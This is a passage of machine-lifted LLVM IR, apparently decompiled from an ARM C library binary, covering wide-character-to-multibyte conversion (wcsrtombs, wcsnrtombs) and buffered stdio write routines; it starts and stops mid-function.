  %v2_170e8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_170e8, i32* %stack_var_-16, align 4
  store i32 %v0_170f0, i32* %stack_var_-12, align 4
  %v5_170f8 = inttoptr i32 %v0_170e4 to i8*
  %v6_170f8 = call i32 @__GI_wcsnrtombs(i8* %v5_170f8, i32 %v2_170dc, i32 1, i32 16, i32 %arg3)
  %v2_170fc = icmp eq i32 %v6_170f8, 0
  br i1 %v2_170fc, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_17108 = phi i32 [ %v6_170f8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_17108

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_17118 = load i32, i32* @r2, align 4
  store i32 %v0_17118, i32* @r3, align 4
  %v0_17120 = load i32, i32* @r0, align 4
  %v1_17120 = load i32, i32* @r1, align 4
  %v5_17120 = inttoptr i32 %v0_17120 to i8*
  %v6_17120 = call i32 @__GI_wcsnrtombs(i8* %v5_17120, i32 %v1_17120, i32 -1, i32 %v0_17118, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_17120
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1712c = load i32, i32* @r4, align 4
  store i32 %v3_1712c, i32* %stack_var_-8, align 4
  %v10_17130 = icmp eq i32 %tmp, %arg2
  br i1 %v10_17130, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_171381 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1714c

bb:                                               ; preds = %entry
  %v4_17134 = icmp eq i8* %arg1, null
  %v0_17138 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_17134, label %dec_label_pc_1714c, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17188

dec_label_pc_1714c:                               ; preds = %.thread, %bb
  %v1_1718c.ph = phi i32 [ %v0_17138, %bb ], [ %v0_171381, %.thread ]
  %v2_1713c3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_1714c = icmp eq i8* %arg1, null
  store i32 %v2_1713c3.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_1714c, label %.thread4, label %dec_label_pc_17180

.thread4:                                         ; preds = %dec_label_pc_1714c
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_17188

dec_label_pc_17164:                               ; preds = %dec_label_pc_171a0
  %v0_17164 = call i32 @__errno_location()
  store i32 %v0_17164, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17170 = inttoptr i32 %v0_17164 to i32*
  store i32 84, i32* %v2_17170, align 4
  %v0_171dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_171dc

dec_label_pc_17178:                               ; preds = %dec_label_pc_171b0
  %v3_171b4 = zext i8 %v2_171b4 to i32
  store i32 %v3_171b4, i32* @lr, align 4
  br label %dec_label_pc_171d0

dec_label_pc_17180:                               ; preds = %dec_label_pc_1714c
  store i32 %v2_1713c3.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %bb27, %.thread4, %dec_label_pc_17180
  %v1_1718c20 = phi i32 [ %v0_17138, %bb27 ], [ %v1_1718c.ph, %.thread4 ], [ %v1_1718c.ph, %dec_label_pc_17180 ]
  %v2_171b014 = phi i32 [ %tmp, %bb27 ], [ %v2_1713c3.ph, %.thread4 ], [ %v2_1713c3.ph, %dec_label_pc_17180 ]
  %v1_17188 = load i32, i32* @r3, align 4
  %v3_17188 = icmp uge i32 %v1_1718c20, %v1_17188
  %v1_17188.v1_1718c20 = select i1 %v3_17188, i32 %v1_17188, i32 %v1_1718c20
  store i32 %v1_17188.v1_1718c20, i32* %r4.global-to-local, align 4
  %v1_17194 = inttoptr i32 %arg2 to i32*
  %v2_17194 = load i32, i32* %v1_17194, align 4
  store i32 %v2_17194, i32* @lr, align 4
  store i32 %v1_17188.v1_1718c20, i32* %r0.global-to-local, align 4
  %v2_171c88 = icmp eq i32 %v1_17188.v1_1718c20, 0
  br i1 %v2_171c88, label %dec_label_pc_171d0, label %dec_label_pc_171a0

dec_label_pc_171a0:                               ; preds = %dec_label_pc_17188, %dec_label_pc_171c0.dec_label_pc_171a0_crit_edge
  %v2_171b0 = phi i32 [ %v2_171c0, %dec_label_pc_171c0.dec_label_pc_171a0_crit_edge ], [ %v2_171b014, %dec_label_pc_17188 ]
  %v0_171a8 = phi i32 [ %v0_171a0.pre, %dec_label_pc_171c0.dec_label_pc_171a0_crit_edge ], [ %v2_17194, %dec_label_pc_17188 ]
  %v1_171a0 = inttoptr i32 %v0_171a8 to i32*
  %v2_171a0 = load i32, i32* %v1_171a0, align 4
  %v1_171a8 = add i32 %v0_171a8, 4
  store i32 %v1_171a8, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_171a0, 127
  br i1 %tmp36, label %dec_label_pc_17164, label %dec_label_pc_171b0

dec_label_pc_171b0:                               ; preds = %dec_label_pc_171a0
  %v1_171b0 = trunc i32 %v2_171a0 to i8
  %v3_171b0 = inttoptr i32 %v2_171b0 to i8*
  store i8 %v1_171b0, i8* %v3_171b0, align 1
  %v0_171b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_171b4 = inttoptr i32 %v0_171b4 to i8*
  %v2_171b4 = load i8, i8* %v1_171b4, align 1
  %v2_171b8 = icmp eq i8 %v2_171b4, 0
  br i1 %v2_171b8, label %dec_label_pc_17178, label %dec_label_pc_171c0

dec_label_pc_171c0:                               ; preds = %dec_label_pc_171b0
  %v1_171c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_171c0 = add i32 %v1_171c0, %v0_171b4
  store i32 %v2_171c0, i32* %ip.global-to-local, align 4
  %v0_171c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_171c4 = add i32 %v0_171c4, -1
  store i32 %v1_171c4, i32* %r0.global-to-local, align 4
  %v2_171c8 = icmp eq i32 %v1_171c4, 0
  br i1 %v2_171c8, label %dec_label_pc_171d0, label %dec_label_pc_171c0.dec_label_pc_171a0_crit_edge

dec_label_pc_171c0.dec_label_pc_171a0_crit_edge:  ; preds = %dec_label_pc_171c0
  %v0_171a0.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_171a0

dec_label_pc_171d0:                               ; preds = %dec_label_pc_171c0, %dec_label_pc_17188, %dec_label_pc_17178
  %v0_171d0 = phi i32 [ %v0_171b4, %dec_label_pc_17178 ], [ %v2_171b014, %dec_label_pc_17188 ], [ %v2_171c0, %dec_label_pc_171c0 ]
  %v1_171d0 = load i32, i32* @sp, align 4
  %v9_171d0 = icmp eq i32 %v0_171d0, %v1_171d0
  br i1 %v9_171d0, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_171d0
  %v1_171d4 = load i32, i32* @lr, align 4
  store i32 %v1_171d4, i32* %v1_17194, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_171d0, %bb30
  %v0_171d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_171d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_171d8 = sub i32 %v1_171d8, %v0_171d8
  store i32 %v2_171d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_171dc

dec_label_pc_171dc:                               ; preds = %dec_label_pc_17164, %bb31
  %v0_171dc = phi i32 [ %v0_171dc.pre, %dec_label_pc_17164 ], [ %v2_171d8, %bb31 ]
  store i32 %v0_171dc, i32* %r0.global-to-local, align 4
  %v2_171e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_171e4, i32* %r4.global-to-local, align 4
  ret i32 %v0_171dc

; uselistorder directives
  uselistorder i32 %v0_171dc, { 1, 0 }
  uselistorder i32 %v1_171c4, { 1, 0 }
  uselistorder i32 %v2_171c0, { 0, 2, 1 }
  uselistorder i32 %v2_171a0, { 1, 0 }
  uselistorder i32 %v2_171b014, { 1, 0 }
  uselistorder i32 %v1_1718c.ph, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 7, 17, 0, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 1, 4, 3, 5, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_171dc, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_171a0, { 1, 0 }
  uselistorder label %dec_label_pc_17188, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1714c, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_171fc2 = icmp eq i32 %arg3, 0
  store i1 %v2_171fc2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_171fc2, label %dec_label_pc_1729c, label %dec_label_pc_17208

dec_label_pc_171fcthread-pre-split:               ; preds = %bb22
  %v3_17220 = load i32, i32* %r7.global-to-local, align 4
  %v5_17220 = add i32 %v3_17220, %v4_17214
  store i32 %v5_17220, i32* %r7.global-to-local, align 4
  %v5_17224 = sub i32 %v0_1721c, %v4_17214
  store i32 %v5_17224, i32* %r5.global-to-local, align 4
  %v2_171fc = icmp eq i32 %v5_17224, 0
  store i1 %v2_171fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17224, i32* @r2, align 4
  br i1 %v2_171fc, label %dec_label_pc_171fc.dec_label_pc_1729c.loopexit_crit_edge, label %dec_label_pc_17208

dec_label_pc_17208:                               ; preds = %entry, %dec_label_pc_171fcthread-pre-split
  %v0_1720c = phi i32 [ %v5_17220, %dec_label_pc_171fcthread-pre-split ], [ %arg2, %entry ]
  %v0_17208.in = phi i32 [ %v5_17224, %dec_label_pc_171fcthread-pre-split ], [ %arg3, %entry ]
  %v0_17208 = icmp slt i32 %v0_17208.in, 0
  br i1 %v0_17208, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_17208
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17208, %bb
  %v0_17210 = load i32, i32* @r4, align 4
  %v1_17210 = add i32 %v0_17210, 4
  %v2_17210 = inttoptr i32 %v1_17210 to i32*
  %v3_17210 = load i32, i32* %v2_17210, align 4
  store i32 %v3_17210, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_1720c to i32*
  %v4_17214 = call i32 @__libc_write(i32 %v3_17210, i32* %tmp23)
  store i32 %v4_17214, i32* %r0.global-to-local, align 4
  %v1_17218 = icmp slt i32 %v4_17214, 0
  %v2_17218 = icmp eq i32 %v4_17214, 0
  store i1 %v2_17218, i1* %cpsr_z.global-to-local, align 1
  %v0_1721c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1721c, i32* %r6.global-to-local, align 4
  br i1 %v1_17218, label %dec_label_pc_1722c, label %dec_label_pc_171fcthread-pre-split

dec_label_pc_1722c:                               ; preds = %bb22
  %v0_1722c = load i32, i32* @r4, align 4
  %v1_1722c = inttoptr i32 %v0_1722c to i32*
  %v2_1722c = load i32, i32* %v1_1722c, align 4
  store i32 %v2_1722c, i32* %r3.global-to-local, align 4
  %v1_17230 = add i32 %v0_1722c, 8
  store i32 %v1_17230, i32* %r0.global-to-local, align 4
  %v1_17234 = inttoptr i32 %v1_17230 to i32*
  %v2_17234 = load i32, i32* %v1_17234, align 4
  store i32 %v2_17234, i32* %r0.global-to-local, align 4
  %v3_17234 = add i32 %v0_1722c, 12
  %v4_17234 = inttoptr i32 %v3_17234 to i32*
  %v5_17234 = load i32, i32* %v4_17234, align 4
  %v1_17238 = or i32 %v2_1722c, 8
  store i32 %v1_17238, i32* %r3.global-to-local, align 4
  %v3_1723c = sdiv i32 %v2_1722c, 256
  %v2_17240 = sub i32 %v5_17234, %v2_17234
  store i32 %v2_17240, i32* %r2.global-to-local, align 4
  %v9_17240 = icmp eq i32 %v5_17234, %v2_17234
  store i1 %v9_17240, i1* %cpsr_z.global-to-local, align 1
  %v1_17244 = trunc i32 %v3_1723c to i8
  %v3_17244 = add i32 %v0_1722c, 1
  %v4_17244 = inttoptr i32 %v3_17244 to i8*
  store i8 %v1_17244, i8* %v4_17244, align 1
  %v0_17248 = load i32, i32* %r3.global-to-local, align 4
  %v1_17248 = trunc i32 %v0_17248 to i8
  %v2_17248 = load i32, i32* @r4, align 4
  %v3_17248 = inttoptr i32 %v2_17248 to i8*
  store i8 %v1_17248, i8* %v3_17248, align 1
  %v0_1724c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1724c, label %dec_label_pc_1722c.dec_label_pc_17298_crit_edge, label %dec_label_pc_17250

dec_label_pc_1722c.dec_label_pc_17298_crit_edge:  ; preds = %dec_label_pc_1722c
  %v0_17298.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17298

dec_label_pc_17250:                               ; preds = %dec_label_pc_1722c
  %v0_17250 = load i32, i32* %r2.global-to-local, align 4
  %v1_17250 = load i32, i32* %r5.global-to-local, align 4
  %v9_17250 = icmp eq i32 %v0_17250, %v1_17250
  store i1 %v9_17250, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_17250, %v1_17250
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_17250
  store i32 %v0_17250, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17250, %bb24
  %v0_17258.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1725c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_1727c
  %v2_1725c = phi i32 [ %v2_1725c.pre, %.preheader ], [ %v1_17280, %dec_label_pc_1727c ]
  %v0_17258 = phi i32 [ %v0_17258.pre, %.preheader ], [ %v1_17268, %dec_label_pc_1727c ]
  %v1_17258 = inttoptr i32 %v0_17258 to i8*
  %v2_17258 = load i8, i8* %v1_17258, align 1
  %v3_17258 = zext i8 %v2_17258 to i32
  store i32 %v3_17258, i32* %r3.global-to-local, align 4
  %v3_1725c = inttoptr i32 %v2_1725c to i8*
  store i8 %v2_17258, i8* %v3_1725c, align 1
  %v0_17260 = load i32, i32* %r0.global-to-local, align 4
  %v1_17260 = inttoptr i32 %v0_17260 to i8*
  %v2_17260 = load i8, i8* %v1_17260, align 1
  %v3_17260 = zext i8 %v2_17260 to i32
  store i32 %v3_17260, i32* %r3.global-to-local, align 4
  %v7_17264 = icmp eq i8 %v2_17260, 10
  store i1 %v7_17264, i1* %cpsr_z.global-to-local, align 1
  %v0_17268 = load i32, i32* %r7.global-to-local, align 4
  %v1_17268 = add i32 %v0_17268, 1
  store i32 %v1_17268, i32* %r7.global-to-local, align 4
  br i1 %v7_17264, label %dec_label_pc_17270, label %dec_label_pc_1727c

dec_label_pc_17270:                               ; preds = %bb25
  %v0_17270 = load i32, i32* @r4, align 4
  %v1_17270 = add i32 %v0_17270, 1
  %v2_17270 = inttoptr i32 %v1_17270 to i8*
  %v3_17270 = load i8, i8* %v2_17270, align 1
  %v4_17270 = zext i8 %v3_17270 to i32
  store i32 %v4_17270, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_17270, 2
  %v2_17274 = icmp eq i8 %tmp30, 0
  store i1 %v2_17274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17274, label %dec_label_pc_1727c, label %dec_label_pc_17288

dec_label_pc_1727c:                               ; preds = %dec_label_pc_17270, %bb25
  %v0_1727c = load i32, i32* %r6.global-to-local, align 4
  %v1_1727c = add i32 %v0_1727c, -1
  store i32 %v1_1727c, i32* %r6.global-to-local, align 4
  %v7_1727c = icmp eq i32 %v0_1727c, 1
  store i1 %v7_1727c, i1* %cpsr_z.global-to-local, align 1
  %v1_17280 = add i32 %v0_17260, 1
  store i32 %v1_17280, i32* %r0.global-to-local, align 4
  br i1 %v7_1727c, label %dec_label_pc_1727c.dec_label_pc_17288_crit_edge, label %bb25

dec_label_pc_1727c.dec_label_pc_17288_crit_edge:  ; preds = %dec_label_pc_1727c
  %v0_17288.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17288

dec_label_pc_17288:                               ; preds = %dec_label_pc_17270, %dec_label_pc_1727c.dec_label_pc_17288_crit_edge
  %v0_1728c = phi i32 [ %v1_17280, %dec_label_pc_1727c.dec_label_pc_17288_crit_edge ], [ %v0_17260, %dec_label_pc_17270 ]
  %v0_17288 = phi i32 [ %v0_17288.pre, %dec_label_pc_1727c.dec_label_pc_17288_crit_edge ], [ %v0_17270, %dec_label_pc_17270 ]
  %v1_17288 = add i32 %v0_17288, 8
  %v2_17288 = inttoptr i32 %v1_17288 to i32*
  %v3_17288 = load i32, i32* %v2_17288, align 4
  store i32 %v3_17288, i32* %r3.global-to-local, align 4
  %v2_1728c = add i32 %v0_17288, 16
  %v3_1728c = inttoptr i32 %v2_1728c to i32*
  store i32 %v0_1728c, i32* %v3_1728c, align 4
  %v0_17290 = load i32, i32* %r3.global-to-local, align 4
  %v1_17290 = load i32, i32* %r0.global-to-local, align 4
  %v2_17290 = sub i32 %v1_17290, %v0_17290
  store i32 %v2_17290, i32* %r3.global-to-local, align 4
  %v1_17294 = load i32, i32* %r5.global-to-local, align 4
  %v2_17294 = sub i32 %v1_17294, %v2_17290
  store i32 %v2_17294, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17298

dec_label_pc_17298:                               ; preds = %dec_label_pc_1722c.dec_label_pc_17298_crit_edge, %dec_label_pc_17288
  %v0_17298 = phi i32 [ %v0_17298.pre, %dec_label_pc_1722c.dec_label_pc_17298_crit_edge ], [ %v2_17294, %dec_label_pc_17288 ]
  %v1_17298 = load i32, i32* %r8.global-to-local, align 4
  %v2_17298 = sub i32 %v1_17298, %v0_17298
  store i32 %v2_17298, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1729c

dec_label_pc_171fc.dec_label_pc_1729c.loopexit_crit_edge: ; preds = %dec_label_pc_171fcthread-pre-split
  %v0_1729c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1729c

dec_label_pc_1729c:                               ; preds = %entry, %dec_label_pc_171fc.dec_label_pc_1729c.loopexit_crit_edge, %dec_label_pc_17298
  %v0_1729c = phi i32 [ %v2_17298, %dec_label_pc_17298 ], [ %v0_1729c.pre.pre, %dec_label_pc_171fc.dec_label_pc_1729c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1729c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1729c

; uselistorder directives
  uselistorder i32 %v0_1729c, { 1, 0 }
  uselistorder i32 %v0_17288, { 1, 0 }
  uselistorder i32 %v1_17280, { 0, 2, 1 }
  uselistorder i32 %v0_1727c, { 1, 0 }
  uselistorder i1 %v2_17274, { 1, 0 }
  uselistorder i32 %v1_17268, { 1, 0 }
  uselistorder i32 %v0_17250, { 1, 0, 2 }
  uselistorder i32 %v5_17234, { 1, 0 }
  uselistorder i32 %v2_17234, { 1, 0, 2 }
  uselistorder i32 %v0_1721c, { 1, 0 }
  uselistorder i32 %v4_17214, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_17224, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1729c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17298, { 1, 0 }
  uselistorder label %dec_label_pc_17288, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17208, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_172a4 = load i32, i32* @r4, align 4
  store i32 %v3_172a4, i32* %stack_var_-20, align 4
  %v6_172a4 = load i32, i32* @r5, align 4
  %v9_172a4 = load i32, i32* @r6, align 4
  %v12_172a4 = load i32, i32* @r7, align 4
  %v15_172a4 = load i32, i32* @lr, align 4
  %v1_172a8 = add i32 %arg3, 1
  %v2_172a8 = inttoptr i32 %v1_172a8 to i8*
  %v3_172a8 = load i8, i8* %v2_172a8, align 1
  %v4_172a8 = zext i8 %v3_172a8 to i32
  %v3_172ac = mul nuw nsw i32 %v4_172a8, 256
  %v1_172b0 = and i32 %v3_172ac, 512
  store i32 %v1_172b0, i32* @r4, align 4
  %v2_172b0 = icmp eq i32 %v1_172b0, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_172b0, label %dec_label_pc_172c4, label %dec_label_pc_173c0

dec_label_pc_172c4:                               ; preds = %entry
  %v1_172c4 = add i32 %arg3, 4
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  %v1_172cc = add i32 %arg3, 16
  %v2_172cc = inttoptr i32 %v1_172cc to i32*
  %v3_172cc = load i32, i32* %v2_172cc, align 4
  store i32 %v3_172cc, i32* @r0, align 4
  %v1_172d0 = add i32 %arg3, 12
  %v2_172d0 = inttoptr i32 %v1_172d0 to i32*
  %v3_172d0 = load i32, i32* %v2_172d0, align 4
  %v4_172d4 = icmp eq i32 %v3_172c4, -2
  %v2_172d8 = sub i32 %v3_172d0, %v3_172cc
  br i1 %v4_172d4, label %dec_label_pc_172d8, label %dec_label_pc_17300

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172c4
  %v3_172dc = icmp ugt i32 %v2_172d8, %arg2
  br i1 %v3_172dc, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_172d8
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_172d8, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_172d8, %dec_label_pc_172d8 ]
  %v0_172e4 = phi i32 [ %arg2, %bb ], [ %v2_172d8, %dec_label_pc_172d8 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_172e4, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_172ec = call i32 @memcpy()
  %v0_172f0 = load i32, i32* @r5, align 4
  %v1_172f0 = add i32 %v0_172f0, 16
  %v2_172f0 = inttoptr i32 %v1_172f0 to i32*
  %v3_172f0 = load i32, i32* %v2_172f0, align 4
  %v1_172f4 = load i32, i32* @r4, align 4
  %v2_172f4 = add i32 %v1_172f4, %v3_172f0
  store i32 %v2_172f4, i32* %v2_172f0, align 4
  br label %dec_label_pc_173d4

dec_label_pc_17300:                               ; preds = %dec_label_pc_172c4
  %tmp = icmp ult i32 %v2_172d8, %arg2
  br i1 %tmp, label %dec_label_pc_173a0, label %dec_label_pc_1730c

dec_label_pc_1730c:                               ; preds = %dec_label_pc_17300
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17314 = call i32 @memcpy()
  %v0_17318 = load i32, i32* @r5, align 4
  %v1_17318 = add i32 %v0_17318, 16
  %v2_17318 = inttoptr i32 %v1_17318 to i32*
  %v3_17318 = load i32, i32* %v2_17318, align 4
  %v1_1731c = add i32 %v0_17318, 1
  %v2_1731c = inttoptr i32 %v1_1731c to i8*
  %v3_1731c = load i8, i8* %v2_1731c, align 1
  %v1_17320 = load i32, i32* @r6, align 4
  %v2_17320 = add i32 %v1_17320, %v3_17318
  %tmp17 = urem i8 %v3_1731c, 2
  %v2_17324 = icmp eq i8 %tmp17, 0
  store i32 %v2_17320, i32* %v2_17318, align 4
  br i1 %v2_17324, label %dec_label_pc_173d4, label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %dec_label_pc_1730c
  %v0_17330 = load i32, i32* %r7.global-to-local, align 4
  %v0_17338 = load i32, i32* @r6, align 4
  %v4_1733c = call i32 @memrchr(i32 %v0_17330, i32 10, i32 %v0_17338, i32 %v2_17320)
  %v2_17340 = icmp eq i32 %v4_1733c, 0
  br i1 %v2_17340, label %dec_label_pc_173d4, label %dec_label_pc_17348

dec_label_pc_17348:                               ; preds = %dec_label_pc_17330
  %v0_17348 = load i32, i32* @r5, align 4
  store i32 %v0_17348, i32* @r0, align 4
  %v0_1734c = call i32 @__stdio_wcommit()
  %v2_17350 = icmp eq i32 %v0_1734c, 0
  br i1 %v2_17350, label %dec_label_pc_173d4, label %dec_label_pc_17358

dec_label_pc_17358:                               ; preds = %dec_label_pc_17348
  %v0_17358 = load i32, i32* @r6, align 4
  %v3_17358 = icmp uge i32 %v0_17358, %v0_1734c
  %v0_1734c.v0_17358 = select i1 %v3_17358, i32 %v0_1734c, i32 %v0_17358
  store i32 %v0_1734c.v0_17358, i32* @r4, align 4
  %v2_17364 = sub i32 %v0_17358, %v0_1734c.v0_17358
  %v0_17368 = load i32, i32* %r7.global-to-local, align 4
  %v2_17368 = add i32 %v0_17368, %v2_17364
  store i32 %v2_17368, i32* %r7.global-to-local, align 4
  store i32 %v0_1734c.v0_17358, i32* @r2, align 4
  %v4_17378 = call i32 @__GI_memchr(i32 %v2_17368, i32 10, i32 %v0_1734c.v0_17358, i32 %v2_17364)
  %v2_1737c = icmp eq i32 %v4_17378, 0
  br i1 %v2_1737c, label %dec_label_pc_173d4, label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %dec_label_pc_17358
  %v0_17384 = load i32, i32* @r5, align 4
  %v1_17384 = add i32 %v0_17384, 16
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  %v0_17388 = load i32, i32* %r7.global-to-local, align 4
  %v1_17388 = load i32, i32* @r4, align 4
  %v2_17388 = sub i32 %v0_17388, %v4_17378
  %v2_1738c = add i32 %v2_17388, %v1_17388
  %v2_17390 = sub i32 %v3_17384, %v2_1738c
  %v1_17394 = load i32, i32* @r6, align 4
  %v2_17394 = sub i32 %v1_17394, %v2_1738c
  store i32 %v2_17394, i32* @r6, align 4
  store i32 %v2_17390, i32* %v2_17384, align 4
  br label %dec_label_pc_173d4

dec_label_pc_173a0:                               ; preds = %dec_label_pc_17300
  %v1_173a0 = add i32 %arg3, 8
  %v2_173a0 = inttoptr i32 %v1_173a0 to i32*
  %v3_173a0 = load i32, i32* %v2_173a0, align 4
  %v9_173a4 = icmp eq i32 %v3_172cc, %v3_173a0
  br i1 %v9_173a4, label %dec_label_pc_173c0, label %dec_label_pc_173ac

dec_label_pc_173ac:                               ; preds = %dec_label_pc_173a0
  store i32 %arg3, i32* @r0, align 4
  %v0_173b0 = call i32 @__stdio_wcommit()
  %v2_173b4 = icmp eq i32 %v0_173b0, 0
  br i1 %v2_173b4, label %dec_label_pc_173ac.dec_label_pc_173c0_crit_edge, label %bb13

dec_label_pc_173ac.dec_label_pc_173c0_crit_edge:  ; preds = %dec_label_pc_173ac
  %v0_173c8.pre = load i32, i32* @r6, align 4
  %v0_173c0.pre = load i32, i32* @r5, align 4
  %v0_173c4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_173cc.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_173c0

bb13:                                             ; preds = %dec_label_pc_173ac
  %v1_173b8 = load i32, i32* @r4, align 4
  store i32 %v1_173b8, i32* @r6, align 4
